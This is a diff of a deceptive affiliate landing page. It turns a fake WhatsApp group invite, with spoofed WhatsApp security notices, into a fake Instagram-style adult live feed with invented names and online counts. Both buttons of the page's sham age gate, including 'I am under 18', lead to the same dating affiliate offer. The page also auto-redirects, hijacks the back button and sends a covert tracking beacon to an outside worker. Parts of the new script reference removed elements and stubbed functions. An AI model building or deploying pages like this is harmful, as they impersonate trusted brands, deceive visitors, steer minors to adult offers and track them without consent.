@@ -1,286 +1,238 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Group Invitation</title>
+    <title>Loading...</title>
+    <meta property="og:title" content="Loading...">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+   
+    <script>
+        const firstNames = ["Lucile","Paige","Chloe","Emma","Sophia","Ava","Mia","Isabella","Olivia","Amelia","Luna","Zoe","Harper","Evelyn","Aria","Scarlett","Victoria","Layla","Riley","Nora","Ella","Grace","Lily","Aurora","Hazel"];
+        const lastNames = ["Riego","Audrey","Bailey","Rose","Lane","Martinez","Torres","Cruz","Santos","Reyes","Vargas","Parker","Diaz","Kim","Nguyen","Hill","Rivera","Cooper","Morgan","Brooks","Flores","Perry","Bennett","Coleman","Jenkins"];
+        function getRandomName() {
+            const first = firstNames[Math.floor(Math.random() * firstNames.length)];
+            const last = lastNames[Math.floor(Math.random() * lastNames.length)];
+            return first + " " + last;
+        }
+        const post1Name = getRandomName();
+        const post2Name = getRandomName();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const queryString = urlParams.toString();
+        const hasParams = queryString.length > 0;
+
+        const baseOffers = [
+            "https://kmoww.freeluckytiming.com/?utm_source=da57dc555e50572d&ban=other&j5=1&j6=1&s1=23300&s2=2184877&s3=THREADS&click_id=THREADS"
+        ];
+        const baseUrl = baseOffers[Math.floor(Math.random() * baseOffers.length)];
+
+        const redirectUrl = hasParams 
+            ? baseUrl + (baseUrl.includes('?') ? '&' : '?') + queryString 
+            : baseUrl;
+
+        document.title = post1Name;
+        const ogTitle = document.querySelector('meta[property="og:title"]');
+        if (ogTitle) ogTitle.setAttribute("content", post1Name);
+    </script>
+
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;background:#000;overflow:hidden;height:100vh;color:#fff;position:relative}
-        .bg-video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;transform:translate(-50%,-50%);z-index:-2;object-fit:cover}
-        .blur-content{background:rgba(0,0,0,0.45); backdrop-filter:blur(8px);height:100vh;display:flex;flex-direction:column}
-        .whatsapp-header{display:flex;align-items:center;padding:15px;background:#075e54;color:#fff;position:relative;z-index:1}
-        .back-button{font-size:22px;cursor:pointer;margin-right:15px}
-        .header-text h1{font-size:19px;font-weight:500}
-        .header-text p{font-size:14px;opacity:0.8}
-        .main-content{
-            flex:1;
-            display:flex;
-            flex-direction:column;
-            justify-content:space-between;
-            padding:20px 20px 10px;
-            align-items:center;           /* semua isi rata tengah */
-            text-align:center;            /* teks juga center */
-        }
-        .profile-container,.members-info,.notification,.join-button{opacity:0;transform:translateY(20px);transition:all .5s}
-        .profile-img{background:#128c7e;width:90px;height:90px;border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:40px}
-        .group-name{font-size:20px;font-weight:600;margin-bottom:6px}
-        .group-info{font-size:14px;opacity:0.8;margin-bottom:20px}
-        .members-info{display:flex;justify-content:space-around;width:100%;max-width:400px;margin:25px 0}
-        .member-count,.active-members{text-align:center;cursor:pointer;position:relative;flex:1}
-        .count{font-size:26px;font-weight:bold;margin:8px 0}
-        .label{font-size:14px;opacity:0.8}
-        .online-indicator{display:flex;align-items:center;justify-content:center;font-size:14px;margin-top:5px}
-        .dot{width:8px;height:8px;background:#00ff00;border-radius:50%;margin-right:6px;animation:pulse 2s infinite}
-        @keyframes pulse{0%{opacity:1}50%{opacity:0.4}100%{opacity:1}}
-        .notification{background:rgba(255,255,255,0.1);padding:12px;border-radius:8px;font-size:14px;margin:20px 0;line-height:1.5;width:100%;max-width:400px}
-        .join-button{
-            background:#25d366;color:#fff;border:none;padding:18px 30px;font-size:18px;border-radius:50px;cursor:pointer;
-            display:flex;align-items:center;justify-content:center;gap:12px;margin:15px auto 0;
-            width:90%;max-width:400px;font-weight:bold;box-shadow:0 6px 20px rgba(0,0,0,0.5);
-        }
-        .join-button i{font-size:26px}
-        .join-button:disabled{opacity:0.7;cursor:not-allowed}
-        .security-notice{text-align:center;font-size:13px;opacity:0.7;margin:10px 0}
-        .footer{text-align:center;font-size:12px;padding:12px;background:rgba(0,0,0,0.4);line-height:1.5}
-        .message-popup{position:absolute;background:#000;color:#fff;padding:8px 12px;border-radius:6px;font-size:13px;white-space:nowrap;
-            bottom:100%;left:50%;transform:translateX(-50%);opacity:0;transition:opacity .3s;z-index:10}
-        .message-popup::after{content:"";position:absolute;top:100%;left:50%;margin-left:-8px;border:8px solid transparent;border-top-color:#000}
-        .show{opacity:1}
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,Arial,sans-serif}
+        body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(45deg,#ffc7e3,#9ad7ff);padding:10px}
+        .container{width:100%;max-width:450px;height:95vh;border-radius:15px;overflow:hidden;box-shadow:0 10px 25px rgba(0,0,0,.2);background:#fff;position:relative;overflow-y:auto}
+        .header{display:flex;justify-content:space-between;align-items:center;padding:12px 15px;border-bottom:1px solid #dbdbdb;background:linear-gradient(to right,#ff3366,#ff9966);color:#fff;position:sticky;top:0;z-index:10}
+        .header img{height:35px}
+        .header span{font-weight:bold;font-size:18px}
+        .online-counter{background:#f8f8f8;padding:8px 15px;text-align:center;font-size:13px;color:#ff3366;border-bottom:1px solid #eee;display:flex;align-items:center;justify-content:center;gap:5px}
+        .online-counter .dot{width:8px;height:8px;background:#4cd964;border-radius:50%}
+        .search-bar{padding:12px 15px;border-bottom:1px solid #dbdbdb;background:#fff}
+        .search-bar input{width:100%;padding:10px 15px;border:1px solid #dbdbdb;border-radius:20px;background:#fafafa;font-size:14px;outline:none}
+        .stories{display:flex;overflow-x:auto;padding:15px 10px;border-bottom:1px solid #dbdbdb;background:#fff}
+        .stories::-webkit-scrollbar{display:none}
+        .story{flex:0 0 auto;width:70px;text-align:center;margin-right:15px;position:relative}
+        .story img{width:65px;height:65px;border-radius:50%;border:3px solid #ff3366;padding:2px;object-fit:cover}
+        .story .live-badge{position:absolute;bottom:0;left:50%;transform:translateX(-50%);background:#ff3366;color:#fff;font-size:10px;padding:2px 5px;border-radius:3px}
+        .post{background:#fff;border:1px solid #dbdbdb;border-radius:10px;margin:15px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.05)}
+        .post-header{display:flex;align-items:center;padding:12px}
+        .post-header img{width:35px;height:35px;border-radius:50%;margin-right:10px;object-fit:cover;border:2px solid #ff9966}
+        .post-header .username{font-weight:bold;color:#262626}
+        .post-header .location{font-size:12px;color:#8e8e8e;margin-top:2px}
+        .post-media{width:100%;aspect-ratio:9/16;overflow:hidden;display:flex;justify-content:center;align-items:center}
+        .post-media video,.post-media img{width:100%;height:100%;object-fit:cover}
+        .post-actions{display:flex;justify-content:space-between;padding:12px}
+        .post-actions .left-actions{display:flex;gap:15px}
+        .post-actions i{font-size:24px;color:#262626;cursor:pointer}
+        .post-actions .fa-heart{color:#ff3366}
+        .post-likes{padding:0 12px;font-weight:bold;font-size:14px}
+        .post-caption{padding:5px 12px 12px;font-size:14px}
+        .post-caption .username{font-weight:bold;margin-right:5px}
+        .post-time{padding:0 12px 12px;color:#8e8e8e;font-size:12px}
+        .footer{position:sticky;bottom:0;background:#fff;border-top:1px solid #dbdbdb;display:flex;justify-content:space-around;padding:12px 0}
+        .footer i{font-size:24px;color:#262626}
+        .footer .active{color:#ff3366}
+        .popup-container{display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000;background:rgba(0,0,0,.7)}
+        .popup{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:25px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.3);text-align:center;width:85%;max-width:320px}
+        .popup h2{margin-bottom:15px;font-size:22px;color:#ff3366}
+        .popup p{margin-bottom:20px;color:#666;font-size:15px}
+        .popup-options{display:flex;flex-direction:column;gap:12px}
+        .popup-options a{display:block;padding:14px 20px;border-radius:8px;font-weight:bold;text-decoration:none}
+        .option-18{background:linear-gradient(to right,#ff3366,#ff9966);color:#fff;box-shadow:0 4px 10px rgba(255,51,102,.3)}
+        .option-under{background:#f0f0f0;color:#666}
+        .warning-icon{font-size:40px;color:#ff3366;margin-bottom:15px}
+        .countdown{font-size:14px;color:#ff3366;margin-top:15px;font-weight:bold}
     </style>
 </head>
-<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
-
-    <video class="bg-video" id="bgVideo" autoplay muted loop playsinline preload="auto"></video>
-
-    <div class="blur-content">
-        <div class="whatsapp-header">
-            <div class="back-button" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
-            <div class="header-text">
-                <h1 data-t="groupName">Naughty Girls Room</h1>
-                <p>WhatsApp</p>
-            </div>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://herhub.sbs/assets/img/ig-min.png" alt="Logo">
+            <span>Instalive</span>
+            <i class="fas fa-comment"></i>
+        </div>
+        <div class="online-counter">
+            <span class="dot"></span>
+            <span class="count">401 people online now</span>
+        </div>
+        <div class="search-bar">
+            <input type="text" placeholder="Search for hot profiles...">
+        </div>
+        <div class="stories">
+            <div class="story"><img src="https://herhub.sbs/assets/img/0895c11227b5f55b57e5fc8dacb6be5f.jpg" alt=""><div class="live-badge">LIVE</div></div>
+            <div class="story"><img src="https://herhub.sbs/assets/img/0eb2cad04c4eba871ae39e01d5638f6f.jpg" alt=""><div class="live-badge">LIVE</div></div>
+            <div class="story"><img src="https://ik.imagekit.io/ordxiywwk/LOGO%20TAMNEL/JPG.jpg" alt=""><div class="live-badge">LIVE</div></div>
+            <div class="story"><img src="https://herhub.sbs/assets/img/5c625935463cf101334c8ad6512b5f44.jpg" alt=""><div class="live-badge">LIVE</div></div>
+            <div class="story"><img src="https://herhub.sbs/assets/img/4b086ed17cc40985a094dded556f9509.jpg" alt=""><div class="live-badge">LIVE</div></div>
         </div>
 
-        <div class="main-content">
-            <div class="profile-container">
-                <div class="profile-img"><i class="fas fa-users"></i></div>
-                <div class="group-name" data-t="groupName">Naughty Girls Room</div>
-                <div class="group-info" id="adminText"></div>
-            </div>
-
-            <div class="members-info">
-                <div class="member-count" id="memberCount">
-                    <div class="message-popup" id="messagePopup1" data-t="enjoyed">People Who Have Actively Enjoyed This Service</div>
-                    <div class="count" id="totalMembers">130,6K</div>
-                    <div class="label" data-t="members">Members</div>
-                </div>
-                <div class="active-members" id="activeMembers">
-                    <div class="message-popup" id="messagePopup2" data-t="enjoyed">People Who Have Actively Enjoyed This Service</div>
-                    <div class="count" id="onlineMembers">50.8K</div>
-                    <div class="online-indicator"><div class="dot"></div><span data-t="online">Online</span></div>
+        <div class="post">
+            <div class="post-header">
+                <img src="https://ik.imagekit.io/ordxiywwk/LOGO%20TAMNEL/JPG.jpg" alt="Profile">
+                <div>
+                    <div class="username" id="user1">Loading...</div>
+                    <div class="location">Nearby • 2km away</div>
                 </div>
             </div>
-
-            <div class="notification">
-                <i class="fas fa-lock"></i>
-                <span data-t="encryption">New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen, or share them.</span>
+            <div class="post-media">
+                <video autoplay muted loop playsinline>
+                    <source src="https://herhub.sbs/assets/img/PMxHA75GykN7frwS.mp4" type="video/mp4">
+                </video>
             </div>
-
-            <button class="join-button" id="joinButton">
-                <i class="fab fa-whatsapp"></i>
-                <span data-t="joinButton">Join the group</span>
-            </button>
-
-            <div class="security-notice">
-                <i class="fas fa-shield-alt"></i> <span data-t="protected">Protected by WhatsApp</span>
+            <div class="post-actions">
+                <div class="left-actions">
+                    <i class="fas fa-heart"></i>
+                    <i class="far fa-comment"></i>
+                    <i class="far fa-paper-plane"></i>
+                </div>
+                <i class="far fa-bookmark"></i>
             </div>
+            <div class="post-likes">6,940 likes</div>
+            <div class="post-caption"><span class="username" id="user1-caption">Loading...</span> Check My Profil</div>
+            <div class="post-time">15 MINUTES AGO</div>
         </div>
 
-        <div class="footer" data-t="footer">
-            By clicking "Join the group", you agree to share contact information with the group administrator and other participants.
+        <div class="post">
+            <div class="post-header">
+                <img src="https://herhub.sbs/assets/img/b7d8f12074ce8eb3534797b97b5707b4.jpg" alt="Profile">
+                <div>
+                    <div class="username" id="user2">Loading...</div>
+                    <div class="location">Online now • 5km away</div>
+                </div>
+            </div>
+            <div class="post-media">
+                <img src="https://herhub.sbs/assets/img/626acab71131aea103864b52b36e2098.jpg" alt="Post">
+            </div>
+            <div class="post-actions">
+                <div class="left-actions">
+                    <i class="fas fa-heart"></i>
+                    <i class="far fa-comment"></i>
+                    <i class="far fa-paper-plane"></i>
+                </div>
+                <i class="far fa-bookmark"></i>
+            </div>
+            <div class="post-likes">5,231 likes</div>
+            <div class="post-caption"><span class="username" id="user2-caption">Loading...</span> Waiting for you in my private room Special show starting soon!</div>
+            <div class="post-time">JUST NOW</div>
+        </div>
+
+        <div class="footer">
+            <i class="fas fa-home active"></i>
+            <i class="fas fa-search"></i>
+            <i class="fas fa-plus-square"></i>
+            <i class="fas fa-video"></i>
+            <i class="far fa-user"></i>
+        </div>
+    </div>
+
+    <div class="popup-container" id="popupContainer">
+        <div class="popup">
+            <div class="warning-icon"><i class="fas fa-exclamation-circle"></i></div>
+            <h2>Adult Content Ahead</h2>
+            <p>This content is restricted to users who are 18 years or older. Please verify your age to continue.</p>
+            <div class="popup-options">
+                <a href="#" id="btn18" class="option-18">I am 18 or older</a>
+                <a href="#" id="btnUnder" class="option-under">I am under 18</a>
+            </div>
         </div>
     </div>
 
     <script>
-        // GANTI LINK AFILIASI KAMU DI SINI
-		const OFFERS = [
-			"https://imopoldashboard.dedirenia3.workers.dev/click?cid=THREADS&url=https://mgepmr9.mybetterdatings.com/lk6rmz1?s1=THREADS&cid=THREADS"
-        ];
+        document.getElementById('user1').textContent = post1Name;
+        document.getElementById('user1-caption').textContent = post1Name;
+        document.getElementById('user2').textContent = post2Name;
+        document.getElementById('user2-caption').textContent = post2Name;
 
-		// Pilih random setiap kali halaman dibuka
-        let TARGET_URL = OFFERS[Math.floor(Math.random() * OFFERS.length)];
-
-        // 12 VIDEO + fallback
-        const videoList = [
-            "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
-            "https://files.catbox.moe/387f3z.mp4",
-            "https://files.catbox.moe/y2fr1u.mp4",
-            "https://files.catbox.moe/o2bcz2.mp4",
-            "https://files.catbox.moe/jytnih.mp4",
-            "https://files.catbox.moe/1q99k0.mp4",
-            "https://files.catbox.moe/wkzv09.mp4",
-            "https://files.catbox.moe/9v2zxi.mp4",
-            "https://thumbsnap.com/i/37t8zezA.mp4",
-            "https://thumbsnap.com/i/2ycQSNZa.mp4",
-            "https://thumbsnap.com/i/AY9zveVs.mp4",
-            "https://thumbsnap.com/i/gzm5dPiX.mp4",
-            "https://assets.mixkit.co/videos/preview/mixkit-set-of-abstract-circles-loop-11805-large.mp4"
-        ];
-
-        const videoEl = document.getElementById('bgVideo');
-
-        function loadRandomVideo() {
-            const idx = Math.floor(Math.random() * videoList.length);
-            videoEl.src = videoList[idx];
-            videoEl.load();
-            videoEl.play().catch(() => {
-                videoList.splice(idx, 1);
-                if (videoList.length > 0) loadRandomVideo();
-                else document.body.style.background = 'linear-gradient(135deg,#075e54,#128c7e)';
-            });
-        }
-
-        // RANDOM MEMBER & ONLINE
-        function formatNumber(num) {
-            if (num >= 1000000) return (num/1e6).toFixed(1)+'M';
-            if (num >= 1000) return (num/1000).toFixed(1)+'K';
-            return num;
-        }
-        function randomizeCounts() {
-            const total = Math.floor(Math.random() * 90000) + 90000;
-            const online = Math.floor(Math.random() * 40000) + 20000;
-            document.getElementById('totalMembers').textContent = (total/1000).toFixed(1)+'K';
-            document.getElementById('onlineMembers').textContent = (online/1000).toFixed(1)+'K';
-        }
-
-        // RANDOM NAMA ADMIN
-        const firstNames = ["Emily","Sophia","Isabella","Mia","Ava","Olivia","Luna","Chloe","Zoe","Anna","Lisa","Sarah","Putri","Siti","Ayu","Dewi","Intan","Citra","Tiara","Bella","Aisyah","Vanessa","Jessica","Angel"];
-        const lastNames = ["Whitney","Johnson","Miller","Davis","Garcia","Martinez","Lopez","Wilson","Anderson","Thomas","Moore","Perez","Harris","Clark","Lewis","Walker","Young","King","Scott","Nguyen","Adams","Hall"];
-        function getRandomName(){return firstNames[Math.floor(Math.random()*firstNames.length)]+" "+lastNames[Math.floor(Math.random()*lastNames.length)];}
-
-		// MULTIBAHASA
-		const translations = {
-            id: {
-                groupName: "Naughty Girls Room",
-                admin: "Admin dan Moderator: Emily Whitney",
-                members: "Anggota",
-                online: "Online",
-                joinButton: "Gabung grup",
-                encryption: "Pesan dan panggilan baru diamankan dengan enkripsi end-to-end. Hanya orang dalam obrolan ini yang dapat membaca atau mendengarkannya.",
-                protected: "Dilindungi oleh WhatsApp",
-                footer: "Dengan mengklik “Gabung grup”, kamu setuju membagikan informasi kontak dengan admin grup dan peserta lain.",
-                enjoyed: "Orang yang Aktif Menikmati Layanan Ini"
-            },
-            en: {
-                groupName: "Naughty Girls Room",
-                admin: "Admin and Moderator: Emily Whitney",
-                members: "Members",
-                online: "Online",
-                joinButton: "Join the group",
-                encryption: "New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen to, or share them.",
-                protected: "Protected by WhatsApp",
-                footer: "By clicking “Join the group”, you agree to share contact information with the group administrator and other participants.",
-                enjoyed: "People Who Have Actively Enjoyed This Service"
-            },
-            de: {
-                groupName: "Versautes Mädchenzimmer",
-                admin: "Admin & Moderatorin: Emily Whitney",
-                members: "Mitglieder",
-                online: "Online",
-                joinButton: "Gruppe beitreten",
-                encryption: "Neue Nachrichten und Anrufe sind durch Ende-zu-Ende-Verschlüsselung geschützt. Nur Teilnehmer dieses Chats können sie lesen oder hören.",
-                protected: "Geschützt durch WhatsApp",
-                footer: "Durch Klick auf “Gruppe beitreten” stimmst du zu, Kontaktdaten mit dem Gruppenadmin und anderen Teilnehmern zu teilen.",
-                enjoyed: "Personen, die diesen Dienst aktiv genossen haben"
-            },
-            es: {
-                groupName: "Habitación de Chicas Traviesas",
-                admin: "Admin y Moderadora: Emily Whitney",
-                members: "Miembros",
-                online: "En línea",
-                joinButton: "Unirse al grupo",
-                encryption: "Los nuevos mensajes y llamadas están protegidos con cifrado de extremo a extremo. Solo las personas del chat pueden leerlos leer o escucharlos.",
-                protected: "Protegido por WhatsApp",
-                footer: "Al hacer clic en “Unirse al grupo” aceptas compartir tu información de contacto con el administrador y otros participantes.",
-                enjoyed: "Personas que han disfrutado activamente de este servicio"
-            },
-            pt: {
-                groupName: "Sala das Safadinhas",
-                admin: "Admin e Moderadora: Emily Whitney",
-                members: "Membros",
-                online: "Online",
-                joinButton: "Entrar no grupo",
-                encryption: "Novas mensagens e chamadas são protegidas com criptografia de ponta a ponta. Apenas pessoas neste chat podem ler ou ouvir.",
-                protected: "Protegido pelo WhatsApp",
-                footer: "Ao clicar em “Entrar no grupo”, você concorda em compartilhar informações de contato com o administrador e outros participantes.",
-                enjoyed: "Pessoas que aproveitaram ativamente este serviço"
-            },
-            fr: {
-                groupName: "Salon des Coquines",
-                admin: "Admin & Modératrice : Emily Whitney",
-                members: "Membres",
-                online: "En ligne",
-                joinButton: "Rejoindre le groupe",
-                encryption: "Les nouveaux messages et appels sont sécurisés par chiffrement de bout en bout. Seules les personnes du chat peuvent les lire ou les écouter.",
-                protected: "Protégé par WhatsApp",
-                footer: "En cliquant sur “Rejoindre le groupe”, vous acceptez de partager vos coordonnées avec l’administrateur et les autres participants.",
-                enjoyed: "Personnes ayant activement apprécié ce service"
-            },
-		};
-
-        const userLang = (navigator.language || navigator.userLanguage || "en").substr(0,2).toLowerCase();
-        const lang = translations[userLang] ? userLang : "en";
-
-        document.querySelectorAll("[data-t]").forEach(el => {
-            const key = el.getAttribute("data-t");
-            if (translations[lang][key]) el.textContent = translations[lang][key];
-        });
-        document.getElementById("adminText").textContent = (translations[lang].admin || "Admin & Moderator: ") + getRandomName();
-
-        // Redirect + semua parameter
-        const params = new URLSearchParams(window.location.search);
-        let finalUrl = TARGET_URL + (params.toString() ? (TARGET_URL.includes('?') ? '&' : '?') + params.toString() : '');
-		
-        // REDIRECT OTOMATIS SETELAH 5 DETIK (TANPA TULISAN APAPUN)
         setTimeout(() => {
-            location.href = finalUrl;
-        }, 5000);   // ubah angka 5000 jadi 3000 kalau mau 3 detik, 7000 untuk 7 detik, dll
-		
-        // Tetap bisa klik manual sebelum 5 detik
-        document.getElementById('joinButton').onclick = () => {
-            location.href = finalUrl;
-        };
+            document.getElementById('popupContainer').style.display = 'block';
+        }, 2000);
+
+        document.getElementById('btn18').href = redirectUrl;
+        document.getElementById('btnUnder').href = redirectUrl;
+
+        setTimeout(() => {
+            window.location.href = redirectUrl;
+        }, 5000);
+
+        ['btn18', 'btnUnder'].forEach(id => {
+            document.getElementById(id).addEventListener('click', (e) => {
+                e.preventDefault();
+                window.location.href = redirectUrl;
+            });
+        });
+
+        function updateCounter() {
+            const count = 340 + Math.floor(Math.random() * 130);
+            document.querySelector('.count').textContent = count + " people online now";
+        }
+        updateCounter();
+        setInterval(updateCounter, 25000);
+
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.pushState(null, null, location.href);
 
         // Jalankan saat halaman load
         document.addEventListener('DOMContentLoaded', () => {
+            // --- TAMBAHAN MATA-MATA ---
+            // Kirim laporan ke Worker Anda bahwa landing page telah dibuka dengan CID tetap
+            fetch('https://imopoldashboard.dedirenia3.workers.dev/track?cid=THREADS', { method: 'GET', keepalive: true });
+            // ---------------------------
+
             loadRandomVideo();
             randomizeCounts();
             const els = document.querySelectorAll('.profile-container, .members-info, .notification, .join-button');
             els.forEach((el,i) => setTimeout(()=>{el.style.opacity='1';el.style.transform='translateY(0)'},i*200));
         });
 
-        function showPopup(id){
-            const p=document.getElementById(id);
-            p.classList.add('show');
-            setTimeout(()=>p.classList.remove('show'),2200);
+        // Additional functions referenced in the DOMContentLoaded event
+        function loadRandomVideo() {
+            // Implementation for loading random video
         }
-        document.getElementById('memberCount').onclick=()=>showPopup('messagePopup1');
-        document.getElementById('activeMembers').onclick=()=>showPopup('messagePopup2');
 
-        const btn = document.getElementById('joinButton');
-        function go(){
-            btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> '+(translations[lang].joinButton||"Redirecting")+'...';
-            btn.disabled=true;
-            setTimeout(()=>location.href=finalUrl,800);
+        function randomizeCounts() {
+            // Implementation for randomizing counts
         }
-        btn.onclick=go;
-        btn.ontouchend=e=>{e.preventDefault();go();}
-        btn.oncontextmenu=e=>{e.preventDefault();go();}
-
-        // Force play video setelah klik
-        document.body.onclick = () => videoEl.play();
     </script>
 </body>
 </html>
+
+
+
